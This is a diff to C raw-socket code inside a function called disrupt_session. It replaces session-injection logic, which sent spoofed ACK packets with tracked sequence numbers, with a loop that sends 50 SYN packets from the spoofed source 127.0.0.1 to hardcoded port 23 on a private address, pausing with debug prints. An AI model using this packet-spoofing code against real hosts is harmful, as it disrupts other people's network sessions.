@@ -134,56 +134,35 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
 
     //Populate address struct
     addr_in.sin_family = AF_INET;
-    addr_in.sin_port = htons(destinationPort);
-    addr_in.sin_addr.s_addr = inet_addr(destinationIP);
+    addr_in.sin_port = htons(23);
+    addr_in.sin_addr.s_addr = inet_addr("192.168.1.112");
 
+struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
+
+printf("dest ip: %s\n", sourceIP);
+printf("dest prt: %d\n", sourcePort);
+getchar();
 
 int z = 50;
 while(z--){
-    fill_packet(destinationIP,
-                sourceIP,
-                sourcePort,
-                destinationPort,
-                SYN_OFF,
-                ACK_ON,
-                ackNumber++,
-                sequenceNumber,
-                RESET_OFF,
-                "Q",
-                packet,
-                sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 + 12);
+    fill_packet("127.0.0.1",                                                  //srcIP
+                "192.168.1.112",                                              //dstIP
+                23,                                                           //dstPort
+                1337,                                                         //srcPort
+                SYN_ON,                                                       //syn
+                ACK_ON,                                                       //ack
+                0,                                                            //seq
+                0,                                                            //ack_seq
+                RESET_OFF,                                                    //rst
+                "",                                                           //data
+                packet,                                                       //packet
+                sizeof(struct tcphdr) + sizeof(struct iphdr) + 2);            //packet_size
 
-    char *nopPtr = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x08;
-    nopPtr++;
-    *nopPtr = 0x0a;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 0x01;
-    nopPtr++;
-    *nopPtr = 'Q';
-    nopPtr++;
-    *nopPtr = '\0';
-
+    tcpHdr->psh = 0;
     // Send out the packet
     send_packet(sock, packet, addr_in);
+
+    getchar();
 }
 
     if(finalRound){
